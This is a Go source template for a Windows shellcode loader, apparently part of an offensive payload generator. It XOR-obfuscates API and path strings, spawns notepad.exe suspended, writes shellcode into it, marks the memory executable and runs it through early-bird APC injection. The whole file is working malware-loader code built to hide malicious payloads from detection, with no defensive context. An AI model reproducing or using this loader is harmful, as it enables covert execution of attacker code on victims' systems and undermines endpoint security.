package main

import (
	"encoding/base64"
	"golang.org/x/sys/windows"
	_ "strings"
	"syscall"
	"unsafe"
	_ "fmt"
	_ "math"
	_ "os"
)

var (
	kernel32           = syscall.MustLoadDLL(encodeString(`{{encode "kernel32.dll" .Key }}`))
	virtualAllocEx     = kernel32.MustFindProc(encodeString(`{{encode "VirtualAllocEx" .Key }}`))
	virtualProtectEx   = kernel32.MustFindProc(encodeString(`{{encode "VirtualProtectEx" .Key }}`))
	writeProcessMemory = kernel32.MustFindProc(encodeString(`{{encode "WriteProcessMemory" .Key}}`))
	queueUserAPC       = kernel32.MustFindProc(encodeString(`{{encode "QueueUserAPC" .Key }}`))
	key                = "{{ .Key }}"
)

func encodeString(s string) (res string) {
	tmp, _ := base64.StdEncoding.DecodeString(s)
	x, _ := base64.StdEncoding.DecodeString(key)
	for i := 0; i < len(tmp); i++ {
		res += string(tmp[i] ^ x[i%len(x)])
	}
	return
}

func encodeByteArray(s string) (res []byte) {
	tmp, _ := base64.StdEncoding.DecodeString(s)
	x, _ := base64.StdEncoding.DecodeString(key)
	for i := 0; i < len(tmp); i++ {
		res = append(res, tmp[i]^x[i%len(x)])
	}
	return
}

func main() {
	sc := encodeByteArray("{{ .ShellcodeEncoded }}")
	n := {{ .Size }}

	pi := &windows.ProcessInformation{}
	si := &windows.StartupInfo{
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}

	victimProc := encodeString(`{{encode "C:\\Windows\\System32\\notepad.exe" .Key}}`)
	_ = windows.CreateProcess(syscall.StringToUTF16Ptr(victimProc), nil, nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, si, pi)

	targetHandle := uintptr(pi.Process)
	threadHandle := uintptr(pi.Thread)

	addr, _, _ := virtualAllocEx.Call(targetHandle, uintptr(0), uintptr(n), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)

	var nWritten uintptr
	_, _, _ = writeProcessMemory.Call(targetHandle, addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(n), uintptr(unsafe.Pointer(&nWritten)))

	var oldProtect uint32
	_, _, _ = virtualProtectEx.Call(targetHandle, addr, uintptr(n), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	
	_, _, _ = queueUserAPC.Call(addr, threadHandle, uintptr(0))
	windows.ResumeThread(pi.Thread)
}
